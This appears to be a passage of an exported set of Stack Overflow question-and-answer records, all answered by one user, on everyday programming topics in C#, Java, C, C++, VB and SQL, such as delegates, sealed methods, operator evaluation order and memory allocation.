"<p>I can make abstract class equivalent to interface by putting all abstract methods within abstract class. Why did Java's designers choose to provide support for interfaces and single inheritance instead of multiple inheritance and abstract classes.  What is the advantage?</p>
","33708","","<p>At least for one reason (besides the conceptual differences between the two): you can implement multiple interfaces but you can only inherit from a single abstract class at most.</p>
"
"<p>I have two similar functions I hope to refactor to remove duplication:</p>

<pre><code>IEnumerable&lt;TotalType&gt; GetTotalForMonths(string id, DateTime lastTotalDate)
{
    for (int i = 0; lastTotalDate.AddMonths(i + 1) &lt;= DateTime.Now; i++)
    {
        var totalStartDate = new DateTime(lastTotalDate.AddMonths(i).Year, lastTotalDate.AddMonths(i).Month, 1);
        var totalEndDate = totalStartDate.AddMonths(1);
        var total = this.GetTotal(id, totalStartDate, totalEndDate);
        yield return new TotalType(id, total, new TimeInterval(totalStartDate, totalEndDate));
    }
}
</code></pre>

<p>The other does the same thing for days. I hope to pass in a delegate to generic-ize the particular duration (days, months, etc). I tried passing in <code>Func&lt;DateTime, DateTime&gt; addTime</code>, which works well, except that I don't want to specify addTime's arg value.</p>

<p>Suggestions?</p>
","33708","","<p>I'm not sure if I understood your question correctly, but if you want to pass <code>AddMonth</code> method as an argument, without specifying the receiver object, you can construct a lambda:</p>

<pre><code>GetTotal(id, lastDate, (dt, num) =&gt; dt.AddMonth(num))
</code></pre>

<p>to call the ""genericized"" function.</p>

<p>You need to declare the function as:</p>

<pre><code>IEnumerable&lt;TotalType&gt; GetTotal(string id, DateTime lastTotalDate,
   Func&lt;DateTime, int, DateTime&gt; adder)
</code></pre>
"
"<p>I would like to do something like</p>

<pre><code>NameOfTheMethod(parameters){
  // Code...
}
</code></pre>

<p>There's using, foreach, for, etc. that are already built-in, but I don't know if creating something similar is even possible. Is it?</p>

<p>The reason why I ask this is because sometimes that there are many different pieces of code that are wrapped by basically the same code (examples are opening a connection to the database, creating the command, settings the datareader, testing if an element exists in cache and, if not, go get it, otherwise get it from cache, etc.)</p>
","33708","","<p>Yes, you can take a delegate instance as an argument:</p>

<pre><code>void MyMethod(Func&lt;Arg1Type, Arg2Type, ReturnType&gt; worker) {
    Arg1Type val1 = something;
    Arg2Type val2 = somethingelse;
    ReturnType retVal = worker(something, somethingelse);
    // ...
}
</code></pre>

<p>You'd call it like:</p>

<pre><code>MyMethod((arg1, arg2) =&gt; {
  // do something here with the arguments
  return result;
});
</code></pre>
"
"<p>I'm reading some bytes out of a byte stream and they look like this:</p>

<pre><code>OUTPUT:
48 -84 -79 -84 -73 -79 46 48 -84

SHOULD BE:
48  44  49  44  55  49 46 48  44
</code></pre>

<p>I'd like to turn these into ascii characters but those negitive symbols are confusing me.  This makes me think I don't understand signed bytes.  What on earth am I doing wrong here?</p>
","33708","","<p>It's a 8-bit signed integer. Like 32-bit integers, but with a smaller range.</p>
"
"<p>I am trying to figure out a way of combining the below Dim statements into one line and maybe also combining Return dblResult into there. currently it is three lines and I have been told that it is possible but kind of lost of how to do it - can anyone lend a hand please?</p>

<p>`
Private Function CalcAreaFromRadius(ByVal radius As Double) As Double</p>

<pre><code>    Dim dblRadiusSquared As Double = radius * radius
    Dim dblResult As Double = dblRadiusSquared * Math.PI

    Return dblResult

End Function`
</code></pre>

<p>Thanks</p>
","33708","","<p>While it's not a good idea to put a large number of stuff on one line, you can always use <code>:</code> to put two lines of code in one line in VB:</p>

<p>Canonical example:</p>

<pre><code>Class Test
     Inherits BaseClass
</code></pre>

<p>is equivalent to:</p>

<pre><code>Class Test : Inherits BaseClass
</code></pre>

<p>Of course, as long as you are declaring variables on a single type without an explicit initialization expression, you can do that in one <code>Dim</code> statement:</p>

<pre><code>Dim a, b as Integer
</code></pre>
"
"<p>Does anyone know how the source code is declared for the Func and Action pointers? I'm trying to understand the theory behind making an asynchronous call using delegates and how that is tied to threading.</p>

<p>For example, if I have the code below:</p>

<pre><code>    static void Main()
{
  Func&lt;string, int&gt; method = Work;
  IAsyncResult cookie = method.BeginInvoke (""test"", null, null);
  //
  // ... here's where we can do other work in parallel...
  //
  int result = method.EndInvoke (cookie);
  Console.WriteLine (""String length is: "" + result);
}

static int Work (string s) { return s.Length; }
</code></pre>

<p>How would I use the 'delegate' type to replace the Func&lt;> structure; the reason I'd like to figure it out is because Func can only take an input and a return variable. It doesn't allow for design flexibility in the method that it's pointing to.</p>

<p>Thanks!</p>
","33708","","<p><code>Func&lt;T&gt;</code> is nothing special, really. It's simply:</p>

<pre><code>public delegate T Func&lt;T&gt;();
</code></pre>

<p>In fact, to support different number of arguments, there are a bunch of them declared, like:</p>

<pre><code>public delegate void Action();
public delegate void Action&lt;T&gt;(T arg);
public delegate U Func&lt;T, U&gt;(T arg);
// so on...
</code></pre>
"
"<p>I am a newbie in C#.I am reading about Sealed keyword.I have got about sealed class.I have read a line about Sealed method where we can make Sealed method also.The line was (<strong>By declaring method as sealed, we can avoid further overriding of this method.</strong>) 
I have created a demo but didn't understand that the meaning of above line and sealed method use. Below is my code:-</p>

<pre><code>using System;

namespace ConsoleApplication2
{
    class Program:MyClass
    {
        public override sealed void Test()
        {
            Console.WriteLine(""My class Program"");
        }
        static void Main(string[] args)
        {
            Program obj = new Program();
            obj.Test();
            Console.ReadLine();
        }
    }

    class MyClass
    {
        public virtual void Test()
        {
            Console.WriteLine(""My class Test"");
        }
    }


}
</code></pre>

<p>Please tell me why we use Sealed methods and what are the advantages of Sealed methods.</p>
","33708","","<p>Well, you are testing with only two levels of inheritance, and you are not getting to the point that you're ""further overriding"" a method. If you make it three, you can see what <code>sealed</code> does:</p>

<pre><code>class Base {
   public virtual void Test() { ... }
}
class Subclass1 : Base {
   public sealed override void Test() { ... }
}
class Subclass2 : Subclass1 {
   public override void Test() { ... } // FAILS!
   // If `Subclass1.Test` was not sealed, it would've compiled correctly.
}
</code></pre>
"
"<p>I have a piece of code which creates a std::vector&lt;T> with a known size:</p>

<pre><code>std::vector&lt;T&gt; vectorOfTs(n);
</code></pre>

<p>Does calling push_back increase the size to n+1?</p>

<pre><code>vectorOfTs.push_back(T());
</code></pre>
","33708","","<p>Yes; note that <code>vector&lt;T&gt;.capacity()</code> is different from <code>vector&lt;T&gt;.size()</code>. The latter denotes the number of elements currently in the vector while the former represents the number of items that fit in the space currently allocated for the vector's internal buffer.</p>
"
"<p>I've had a small problem with splitting a String in java as follows: </p>

<pre><code>System.out.println(dexListMod.get(selNum-1).getClass().getName());
String dexListTempString = dexListMod.get(selNum-1);
</code></pre>

<p>The first line prints the class name of the Object returned from the index of selNum -1 in the Vector dexListMod. This outputs the following in the console:</p>

<pre><code>java.lang.String
</code></pre>

<p>The second line defines a String of this same Object to split() later but, and this is the problem, the compiler says that they are incompatible types! Am I seeing this wrong, or is this a contradiction?</p>

<p>Thanks.</p>
","33708","","<p>The problem is that what matters for Java compiler is the static type of the object, not what it actually is at runtime. </p>

<p>Similarly, the following example is rejected by the Java compiler:</p>

<pre><code>SuperClass a = new SubClass1();
a.SomeMethodInSubClass1ButNotInBaseClass(); // fails
</code></pre>

<p>If the compiler allowed this, you could have assigned something else to <code>a</code> like:</p>

<pre><code>SuperClass a = new SubClass1();
a = new SubClass2(); // it doesn't have the method!
a.SomeMethodInSubClass1ButNotInBaseClass(); // would fail at runtime if allowed
</code></pre>

<p>In the general case, it's theoretically impossible to find the exact runtime type of a variable at compile time. The compiler remains conservative and simply fails to compile instead of assuming correctness and possibly failing at runtime (dynamic languages like Python usually choose the opposite design decision: assume correctness and potentially failing at runtime). </p>

<p>Your code snippet essentially demonstrates the same thing, where the return type of <code>dexListMod.get</code> method is probably <code>Object</code>, and it returns a <code>String</code> instance (which is derived from <code>Object</code>).</p>

<p>If you are sure about the runtime type of an object, Java requires you to be explicit about it and take the responsibility to manually cast it to the type you expect. Of course, the cast can potentially fail at runtime and throw an exception.</p>
"
"<p>I am trying to understand the difference between &amp; and &amp;&amp; operators in C#. I searched on the internet without much success. Can somebody please explain with an example?</p>
","33708","","<p><code>&amp;</code> is the bitwise and operator. For operands of integer types, it'll calculate the bitwise-and of the operands and the result will be an integer type. For boolean operands, it'll compute the logical-and of operands. <code>&amp;&amp;</code> is the logical and operator and doesn't work on integer types. For boolean types, where both of them can be applied, the difference is in the ""short-circuiting"" property of <code>&amp;&amp;</code>. If the first operand of <code>&amp;&amp;</code> evaluates to false, the second is not evaluated at all. This is not the case for <code>&amp;</code>:</p>

<pre><code> bool f() {
    Console.WriteLine(""f called"");
    return false;
 }
 bool g() {
    Console.WriteLine(""g called"");
    return false;
 }
 static void Main() {
    bool result = f() &amp;&amp; g(); // prints ""f called""
    Console.WriteLine(""------"");
    result = f() &amp; g(); // prints ""f called"" and ""g called""
 }
</code></pre>

<p><code>||</code> is similar to <code>&amp;&amp;</code> in this property; it'll only evaluate the second operand if the first evaluates to false.</p>

<p>Of course, user defined types can overload these operators making them do anything they want.</p>
"
"<p>I got like answer from WebClient  String (xml). How to extract with Linq some attributes, for example lat and lng ? </p>

<pre><code>&lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;
&lt;GeocodeResponse&gt;
 &lt;status&gt;OK&lt;/status&gt;
 &lt;result&gt;
  &lt;type&gt;route&lt;/type&gt;
  &lt;formatted_address&gt;Prince Michael St, Belgrade, Serbia&lt;/formatted_address&gt;
  &lt;address_component&gt;
   &lt;long_name&gt;Prince Michael St&lt;/long_name&gt;
   &lt;short_name&gt;Prince Michael St&lt;/short_name&gt;
   &lt;type&gt;route&lt;/type&gt;
  &lt;/address_component&gt;
  &lt;address_component&gt;
   &lt;long_name&gt;Stari Grad&lt;/long_name&gt;
   &lt;short_name&gt;Stari Grad&lt;/short_name&gt;
   &lt;type&gt;sublocality&lt;/type&gt;
   &lt;type&gt;political&lt;/type&gt;
  &lt;/address_component&gt;
  &lt;address_component&gt;
   &lt;long_name&gt;Belgrade&lt;/long_name&gt;
   &lt;short_name&gt;Belgrade&lt;/short_name&gt;
   &lt;type&gt;locality&lt;/type&gt;
   &lt;type&gt;political&lt;/type&gt;
  &lt;/address_component&gt;
  &lt;address_component&gt;
   &lt;long_name&gt;City of Belgrade&lt;/long_name&gt;
   &lt;short_name&gt;City of Belgrade&lt;/short_name&gt;
   &lt;type&gt;administrative_area_level_2&lt;/type&gt;
   &lt;type&gt;political&lt;/type&gt;
  &lt;/address_component&gt;
  &lt;address_component&gt;
   &lt;long_name&gt;Central Serbia&lt;/long_name&gt;
   &lt;short_name&gt;Central Serbia&lt;/short_name&gt;
   &lt;type&gt;administrative_area_level_1&lt;/type&gt;
   &lt;type&gt;political&lt;/type&gt;
  &lt;/address_component&gt;
  &lt;address_component&gt;
   &lt;long_name&gt;Serbia&lt;/long_name&gt;
   &lt;short_name&gt;RS&lt;/short_name&gt;
   &lt;type&gt;country&lt;/type&gt;
   &lt;type&gt;political&lt;/type&gt;
  &lt;/address_component&gt;
  &lt;geometry&gt;
   &lt;location&gt;
    &lt;lat&gt;44.8157361&lt;/lat&gt;
    &lt;lng&gt;20.4593997&lt;/lng&gt;
   &lt;/location&gt;
   &lt;location_type&gt;GEOMETRIC_CENTER&lt;/location_type&gt;
   &lt;viewport&gt;
    &lt;southwest&gt;
     &lt;lat&gt;44.8122468&lt;/lat&gt;
     &lt;lng&gt;20.4564820&lt;/lng&gt;
    &lt;/southwest&gt;
    &lt;northeast&gt;
     &lt;lat&gt;44.8185421&lt;/lat&gt;
     &lt;lng&gt;20.4627772&lt;/lng&gt;
    &lt;/northeast&gt;
   &lt;/viewport&gt;
   &lt;bounds&gt;
    &lt;southwest&gt;
     &lt;lat&gt;44.8150440&lt;/lat&gt;
     &lt;lng&gt;20.4593895&lt;/lng&gt;
    &lt;/southwest&gt;
    &lt;northeast&gt;
     &lt;lat&gt;44.8157449&lt;/lat&gt;
     &lt;lng&gt;20.4598697&lt;/lng&gt;
    &lt;/northeast&gt;
   &lt;/bounds&gt;
  &lt;/geometry&gt;
 &lt;/result&gt;
&lt;/GeocodeResponse&gt;
</code></pre>
","33708","","<p>You can use <code>XDocument.Parse</code> method to get an <code>XDocument</code> object out of a string. You can apply LINQ to XML just like you'd do for any <code>XDocument</code>. For instance, you can get all <code>&lt;lat&gt;</code> elements in the document with:</p>

<pre><code>XDocument.Parse(xmlString).Descendants(""lat"")
</code></pre>

<p>The exact query you use depends on what exactly you want to extract from the document.</p>
"
"<pre><code>int *ptr = malloc(sizeof(char));

*ptr = 100000;

printf(""%d\n"", *ptr); // 100000
</code></pre>

<p>Shouldn't that only allocate enough memory for a <code>char</code>, i.e. 1 byte? Therefore shouldn't the largest number be 255?</p>

<p>How does it still print <code>100000</code>?</p>

<h3>Update</h3>

<p>Thanks for the answers. If it overwrites the next bytes, how does C then know that this number is larger than one byte, and not just look in the first byte?</p>
","33708","","<p>The simplest answer would be: it's not guaranteed to work.</p>

<p>Basically, you are corrupting the memory around the pointer.</p>
"
"<p>The company I work for has outsourced development of an iPhone app to another company. They want the binary to be signed with our certificate for distribution, but they've asked me to pass the private key (certificates.p12) used to create our certificate on to the other company. I am extremely concerned about handing the ability to sign applications as us over to another company.</p>

<p>How can I convince my boss this is a really bad idea? What alternative solutions can I suggest to him? I have already asked him to get the source from them so we can sign and submit it ourselves, but without the ability to conclusively state that giving them the certificate is a bad idea, I'm kinda stuck in the ""just look into it for me"" limbo.</p>
","33708","","<p>You don't need the source.  You just need the compiled binary (make sure it's ARM, not x86) to sign with <code>codesign</code>. </p>
"
"<p>It is said that by using C/C++, one can write 'native' programs - that run on the platform. I am confused about what is considered native - the processor architecture or the OS version?</p>

<p>For example:</p>

<p>I have a 32 bit processor and Windows 7 ( 32 bit ), and I compile and generate and .exe file. Is it guaranteed to run on any Windows 7 32 Bit? ( Win 7 32 bit on 32/64 Bit machines )</p>

<p><strong>Edit1</strong>:
I did not intend only Windows OS here. My example can be extended to Linux also. For example, generating an executable ( by default <code>a.out</code> ) on a 32 bit Linux OS running on 32 bit processor, and then running it on a 32bit Linux on a 64 bit processor.</p>

<p><strong>Edit2</strong>:
Thanks for the responses, but I also intended that I am using the standard libraries and functions - nothing OS Specific. Just the once specified by the ANSI or ISO C++ Standard. No references to OS specific windowing systems or other libraries.
Thanks</p>
","33708","","<p>Both; kind of.</p>

<p>The actual instructions don't really differ across Windows and Linux as they are compiled down for a single CPU architecture (x86).</p>

<p>However, a binary is more than just code that runs on bare hardware.  For instance, it also contains information that tells the operating system how to load the executable and its dependencies.  The binary is packaged in a specific format.  This format can be different in different operating systems.</p>

<p>Besides that, the operating system provides some services to the applications (through system calls and APIs).  The services that operating systems provide, and the way they can be used varies from an operating system to another.</p>

<p>These reasons contribute to the fact that most of the time a native binary depends on both OS and CPU architecture it's compiled for.</p>

<hr>

<p>Answer to the updated question:</p>

<p>C++ Standard doesn't require anything about the nature of the compiled target.  It just specifies compatibility requirements at the source level.  Consequently, if you stick to the standard libraries, you'll be able to use the same <em>source code</em> to compile on platforms that offer a conforming C++ implementation.  The standard doesn't say anything about binary portability.  As I mentioned above, the primitive system calls that operating systems provide can vary and the actual implementation of the standard library depends on the way those system calls are provided by the OS.   </p>

<p>In order to run a Windows binary on Linux, you need to use some sort of emulation like Wine which understands Windows binary format and simulates Windows API for applications.</p>
"
"<p>If I call <code>Assembly.Load(""Example"");</code> 10 times does it load that assembly every time or just once?</p>
","33708","","<p>It's loaded just once.</p>

<p>For more detailed information about loading assemblies in different contexts see <a href=""http://msdn.microsoft.com/en-us/library/dd153782.aspx#load_contexts"" rel=""nofollow"">Best Practices for Assembly Loading</a>.</p>
"
"<p>This code will create an array of 100 elements and set the value of each to false.</p>

<pre><code>bool boolArray[100] = false;
</code></pre>

<p>How can I set the default value of a dynamic array?</p>

<pre><code>void Foo(int size)
{
    bool boolArray = new bool[size];
    //Now what?
}
</code></pre>
","33708","","<p>Use <a href=""http://www.cplusplus.com/reference/algorithm/fill""><code>std::fill</code> function</a> or <a href=""http://www.cplusplus.com/reference/algorithm/fill_n/""><code>std::fill_n</code> function</a>.</p>

<pre><code>std::fill_n(boolArray, length, defaultValue);
std::fill(boolArray, boolArray + length, defaultValue);
</code></pre>

<p><em>Side note: try using <code>std::vector</code> instead.</em></p>
"
"<p>In some comp-sci papers and tests, I see swap() implemented like so:</p>

<pre><code>void swap(int x, int y, int *a)
{
    int t = a[x];
    a[x] = a[y];
    a[y] = t;
}
</code></pre>

<p>Why not simply implement it like so:</p>

<pre><code>void swap(int&amp; x, int&amp; y)
{
    int t = x;
    x = y;
    y = t;
}
</code></pre>

<p>Is the idea to the former to make the calling code cleaner, by not having to index into the array for the first two arguments? I realize it's not a very important question, since we should be using std::swap(), but I'm still curious.</p>
","33708","","<p>Not all programming languages support calling by reference. For instance, the latter way of doing <code>swap</code> doesn't apply to Java.</p>

<p>In books containing pseudo-code, usually there's a convention that arrays and pointers are not copied when passed and everything else is copied in a function call.  The former way requires no special explanation about the way arguments are passed.</p>

<p>Regarding your final point about cleanliness, it's not so much different: in the former case, your call to swap would be simply: <code>swap(i, j, a);</code> whereas in the latter, you'll have to <code>swap(a[i], a[j]);</code>, introducing some brackets in the expression.</p>
"
"<p>I've got a line of code,</p>

<pre><code>list[index++] = recursiveFunction();
</code></pre>

<p>Does <code>index</code> get incremented before or after the call to <code>recursiveFunction</code>?</p>
","33708","","<p>The increment operation is executed <strong>before</strong> the function call. See <a href=""http://msdn.microsoft.com/en-us/library/aa691322(v=VS.71).aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/aa691322(v=VS.71).aspx</a>. Note that this is not relevant to the precedence and associativity of operators.</p>

<blockquote>
  <p>The order of evaluation of operators in an expression is determined by the precedence and associativity of the operators (Section 7.2.1).</p>
  
  <p>Operands in an expression are <strong>evaluated from left to right</strong>. For example, in <code>F(i) + G(i++) * H(i)</code>, method F is called using the old value of i, then method G is called with the old value of i, and, finally, method H is called with the new value of i. This is separate from and unrelated to operator precedence.</p>
</blockquote>

<p>Operator precedence and associativity only affect the way operators are bound to operands. The question here talks about <em>side effects</em> of the evaluation of operands. </p>

<pre><code>using System;

class Obj {
   public bool Incremented {get;set;}
   public static Obj operator ++ (Obj o) {
     Console.WriteLine(""Increment operator is executed."");
     return new Obj {Incremented = true};
   }
}

class L {
  public int this[Obj o] {
    set { Console.WriteLine(""Assignment called with "" + 
            (o.Incremented ? ""incremented"" : ""original"") + "" indexer value.""); }
  }

}
class Test{
  static void Main() {
    Obj o = new Obj();
    L l = new L();
    l[o++] = Func();
  }

  static int Func() {
    Console.WriteLine(""Function call."");
    return 10;
  }
}
</code></pre>

<p>Prints:</p>

<pre><code>Increment operator is executed.
Function call.
Assignment called with original indexer value.
</code></pre>

<p>This behavior is <em>clearly specified</em> in the specification and should be identical in any conforming compiler.</p>
"
"<p>How would i save the date time, with no time or preferably with a time stamp of 12:00, no matter what the time is at that moment?</p>

<p>I dont want to use <code>.ToString(""dd/MM/yyyy"");</code>, because it will open up a whole lot of new  possible errors.</p>
","33708","","<p><code>DateTime</code> struct has a <code>Date</code> property that should serve your needs:</p>

<pre><code>DateTime dateOnly = dateTime.Date;
</code></pre>

<p>Of course, it'll still inevitably contain a time part but you should be able to ignore it.</p>
"
"<p>C# documentation says that you can assign custom attributes to parameters. The exact sentence is: ""A target element can be an assembly, class, constructor, delegate, enum, event, field, interface, method, portable executable file module, parameter, property, return value, struct, or another attribute."" Given that, what would be the correct syntax to do something like this:</p>

<pre><code>private void SomeMethod
([CustomAttribute(Blah = ""blah1"")] string actualParam,
 [CustomAttribute(Blah = ""blah2"")] DateTime anotherParam
)

{
// method's body
}
</code></pre>

<p>Or am I missing something entirely?</p>
","33708","","<p>That's exactly like what you said. For parameters, you'll do something like:</p>

<pre><code>void SomeMethod([MarshalAs(UnmanagedType.FunctionPtr)] Action del);
</code></pre>

<p>For return value, you'd do:</p>

<pre><code>[return: MyAttribute(Param1 = ""Value1"")]
int Method()
</code></pre>

<p>Similarly, there are <code>[module: MyAttribute]</code>, <code>[assembly: MyAttribute]</code> for modules and assemblies.</p>
"
"<p>There is a sort() method for lists in STL. Which is absurd, because I would be more inclined to sort an array/vector.
Why isn't sort() provided for vector? Is there some underlying philosophy behind the creation of the vector container or its usage, that sort is not provided for it?</p>
","33708","","<p>You <em>can</em> easily sort a <code>vector</code> with:</p>

<pre><code>sort(v.begin(), v.end());
</code></pre>

<hr>

<p><em>UPDATE: (answer to the comment):</em> Well, they have certainly provided it <em>by default</em>. The difference is that it's not a member function for <code>vector</code>. <code>std::sort</code> is a generic algorithm that's supposed to work for <em>anything</em> that provides iterators.  However, it really expects a random access iterator to sort efficiently. <code>std::list</code>, being a linked list, cannot provide random access to its elements efficiently. That's why it provides its own specialized sort algorithm.</p>
"
"<p>c# has static constructor which do some initialization. (Likely Do some unmanaged resource initialization) I am wondering if there is static destuctor?</p>
","33708","","<p>No, there isn't.  </p>

<p>A static destructor supposedly would run at the end of execution of a process.  When a process dies, all memory/handles associated with it will get released by the operating system.</p>

<p>If your program should do a specific action at the end of execution (like a transactional database engine, flushing its cache), it's going to be far more difficult to correctly handle than just a piece of code that runs at the end of normal execution of the process. You have to manually handle crashes and unexpected termination of the process and try recovering at next run anyway. The ""static destructor"" concept wouldn't help that much.</p>
"
"<p>i have found a code which is used to escape html chars. i have a question about this code. as you can see it ""alloc""s and does not ""release"" it. does it causes of memory leaks? must it be released?</p>

<pre>
  htmlEscapes = [[NSDictionary alloc] initWithObjectsAndKeys:
//        @""&amp;"", @""&"",
        @""&lt;"", @"""",
        @""&#039;"", @""'"",
        @""&quot;"", @""\"""",        
        nil
        ];
</pre>

<p>thanks...</p>

<p>whole class</p>

<hr>

<pre>

#import ""NSString+HTML.h""


@implementation NSString (HTMLExtensions)

static NSDictionary *htmlEscapes = nil;
static NSDictionary *htmlUnescapes = nil;

+ (NSDictionary *)htmlEscapes {
 if (!htmlEscapes) {
  htmlEscapes = [[NSDictionary alloc] initWithObjectsAndKeys:
//        @""&amp;"", @""&"",
        @""&lt;"", @"""",
        @""&#039;"", @""'"",
        @""&quot;"", @""\"""",        
        nil
        ];
 }
 return htmlEscapes;
}

+ (NSDictionary *)htmlUnescapes {
 if (!htmlUnescapes) {
  htmlUnescapes = [[NSDictionary alloc] initWithObjectsAndKeys:
//       @""&"", @""&amp;"",
       @"""", @""&gt;"",
       @""'"", @""&#039;"",
       @""\"""", @""&quot;"",
       nil
       ];
 }
 return htmlEscapes;
}

static NSString *replaceAll(NSString *s, NSDictionary *replacements) {
 for (NSString *key in replacements) {
  NSString *replacement = [replacements objectForKey:key];
  s = [s stringByReplacingOccurrencesOfString:key withString:replacement];
 }
 return s;
}

- (NSString *)htmlEscapedString {
 return replaceAll(self, [[self class] htmlEscapes]);
}

- (NSString *)htmlUnescapedString {
 return replaceAll(self, [[self class] htmlUnescapes]);
}

@end
</pre>
","33708","","<p>Apparently, only one instance of <code>NSDictionary</code> is created and it's purposefully stored and reused for the life time of the application. It's not considered a memory leak (at least not in a single threaded environment; of course, a potential race condition is possible for the <code>if</code> statement).</p>
"
"<p>Let's say we have a property as below</p>

<pre><code>public string SomeProperty
{
    get
    {
        var propName = ""SomeProperty"";
        return ""&lt;"" + propName + ""&gt;"";
    }
}
</code></pre>

<p>How can I set value of the above variable <code>propName</code> to be the property name by reading from the assembly information itself?</p>

<p><strong>Edit</strong></p>

<p>Why we need this?</p>

<p>I'm using the WPF <code>d:DataContext</code> as mentioned in <a href=""http://stackoverflow.com/questions/4314103/how-to-set-a-value-to-display-for-bound-properties-in-wpf-design-mode/4316450#4316450"">here</a> which will help me to display a 'design-mode' value for bound properties - very often, the bound values are displayed as empty string in design mode. And in the 'design-mode' data-context class, I want to return the property name for every binding properties I may have.</p>

<p>Hope this would explain your concerns.</p>
","33708","","<p>There isn't a reliable way for doing that at runtime, but you can use <a href=""http://msdn.microsoft.com/en-us/library/system.reflection.methodbase.getcurrentmethod.aspx"" rel=""nofollow""><code>MethodBase.GetCurrentMethod().Name</code></a> and throw away the first four characters. </p>

<p>This approach has some flaws: running the binary through an obfuscation tool may cause the method to get renamed. Additionally, the method may be inlined and cause problems (if you just use <code>Remove</code> on the string without checking the length, it may even cause unexpected crashes in the Release build that can be difficult to reproduce in Debug mode).</p>

<p>If your code follows a pattern and you need to generate a bunch of properties like that, it's better to use a compile-time approach like a code generator or an aspect-oriented programming framework.</p>
"
"<p>Good morning,</p>

<p>I am writting a spell checker which, for the case, is performance-critical. That being, and since I am planning to connect to a DB and making the GUI using C#, I wrote an edit-distance calculation routine in C and compiled to a DLL which I use in C# using <code>DllImport</code>. The problem is that <em>I think</em> (though I am possibly wrong) that marshalling words one by one from <code>String</code> to <code>char *</code> is causing a lot of overhead. That being, I thought about using C++/CLI so that I can work with the <code>String</code> type in .NET directly... My question is then how does C++/CLI performance compares to native C code for heavy mathematical calculations and array access?</p>

<p>Thank you very much.</p>
","33708","","<p>C++/CLI will have to do some kind of marshaling too. </p>

<p>Like all performance related problems, you should <em>measure</em> and optimize.  Are you sure C# is not going to be fast enough for your purposes? Don't underestimate the optimizations that JIT compiler is going to do. Don't speculate on the overhead of a language implementation solely for being managed without trying. If it's not enough, have you considered unsafe C# code (with pointers) before trying unmanaged code? </p>

<p>Regarding the performance profile of C++/CLI, it really depends on the way it's used. If you compile to managed code (CIL) with (<code>/clr:pure</code>), it's not going to be very different from C#. Native C++ functions in C++/CLI will have similar performance characteristics to plain C++. Passing objects between native C++ and CLI environment will have some overhead.</p>
"
"<p>What the difference between the two below SQL Statements <strong>(one uses INNER JOIN, and the second uses the from clause)</strong> (Performance, execution time..), <br>and is there any cases i must use one instead of the other?</p>

<pre><code>SELECT Tbl1_Fld1, Tbl2_Fld1 FROM DB1..TABLE1 
INNER JOIN DB2..TABLE1 
on DB1..TABLE1 .Tbl1_Fld1 = DB2..TABLE1.Tbl2_Fld1

SELECT Tbl1_Fld1, Tbl2_Fld1 FROM DB1..TABLE1,DB2..TABLE1 
WHERE DB1..TABLE1 .Tbl1_Fld1 = DB2..TABLE1.Tbl2_Fld1
</code></pre>
","33708","","<p>Given a sane query optimizer, there shouldn't be a difference between the two.</p>
"
"<p>e.g. </p>

<pre><code>public var SomeMethod()
{ 
   return ""hello"";
}
</code></pre>

<p>error:
The contextual keyword <code>var</code> may only appear within a local variable declaration    </p>

<p>Thanks</p>
","33708","","<p>C# only supports type inference for local variables. It doesn't support it for the return type of a non-anonymous function. This is a design decision. It's possible that they change it in the future. Languages like F# do in fact support return type inference so there's no inherent impossibility involved here. Of course, sometimes, the inferred return type may be ambiguous and requires further clarification in the languages that support it:</p>

<pre><code>// not real C#:
public var Method(bool returnInt) {
    if (returnInt) return 42; else return true;
}
// what's the return type of Method is going to be? ValueType? object? ...?
</code></pre>
"
"<p>What is the difference between stoing the multi-dimensional arrays in memory in Row Major or Column Major fashion?</p>

<p>As far as I know, 'C' seems to be following the Row Major style.</p>

<p>Just out of curiosity I would like to know, are there any benefits of one style over another? </p>
","33708","","<p>In general, you can do emulate each one with the other, so there's no inherent advantage to one over the other. However, cache implementations usually consider locality of reference as a positive factor for estimating whether a memory location is going to get accessed soon. That may have performance implications. For instance, in a row-major implementation, this code snippet:</p>

<pre><code>int sum = 0;
for (int i = 0; i &lt; n; ++i)
  for (int j = 0; j &lt; m; ++j) 
     sum += a[i][j];
</code></pre>

<p>is likely to be faster than:</p>

<pre><code>int sum = 0;
for (int i = 0; i &lt; m; ++i)
  for (int j = 0; j &lt; n; ++j) 
     sum += a[j][i];
</code></pre>

<p>You should try to design your algorithms so that you code outer loops over rows in a row-major environment and over columns in a column major environment to minimize cache misses.</p>
"
"<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

typedef struct data {
    int a, b;
} Data ;

struct node {
    Data info;
    int priority;
    struct node *link;
};
typedef struct node* Node;

void insert(Node header, int pr, Data el) {
    Node cur = header;
    Node tmp = malloc(sizeof(struct node));
    tmp-&gt;info = el;
    tmp-&gt;priority = pr;
    //descending &lt;=
    while (cur-&gt;link != NULL &amp;&amp; pr &gt;= cur-&gt;link-&gt;priority)
        cur = cur-&gt;link;
    tmp-&gt;link = cur-&gt;link;
    cur-&gt;link = tmp;
}

Node delete(Node header) {
    Node tmp;
    if (header-&gt;link == NULL)
        printf(""Empty priority queue"");
    else {
        tmp = header-&gt;link;
        header-&gt;link = tmp-&gt;link;
        free(tmp);
        return tmp;
    }
}

void display(Node head) {
    Node cur = head-&gt;link;
    while (cur != NULL) {
        printf(""%d "", cur-&gt;priority);
        cur = cur-&gt;link;
    }

}

int main(int argc, const char *argv[])
{
    Data d;
    Node tmp;
    Node head = malloc(sizeof(struct node));
    head-&gt;link = NULL;

    insert(head, 3, d);

    insert(head, 2, d);
    insert(head, 1, d);
while (head-&gt;link != NULL) {

    tmp = delete(head);
    printf(""%d "", tmp-&gt;priority);
}



    return 0;
}
</code></pre>

<p>The output of this is 1 2 3. but in delete i deallocated the memory(free(tmp)) and then returned tmp. why is it tmp still printing in main function. using gcc compiler</p>
","33708","","<p><code>delete</code>/<code>free</code> don't necessarily zero out memory. They can mark it as deallocated for the memory allocator. The memory allocator is then free to allocate it again in another <code>new</code>/<code>malloc</code> call. The point is, as soon as you freed the memory block, you should not access it. It's <em>undefined behavior</em>. Undefined behavior means it may crash, return garbage, return old value, blow up your computer, <a href=""http://xkcd.com/534/"" rel=""nofollow"">become a skynet</a>, or anything else, depending on the implementation/situation.</p>

<p>If you want to store sensitive information like cryptographic keys/passwords in memory as short as possible, you should fill the memory with something else yourself before freeing it up (e.g. by calling <a href=""http://msdn.microsoft.com/en-us/library/aa366877%28VS.85%29.aspx"" rel=""nofollow""><code>SecureZeroMemory</code></a> in Windows).</p>
"
"<p>This works:</p>

<pre><code>int valueAsInt = 0;

if (Int32.TryParse(value, out valueAsInt))
{
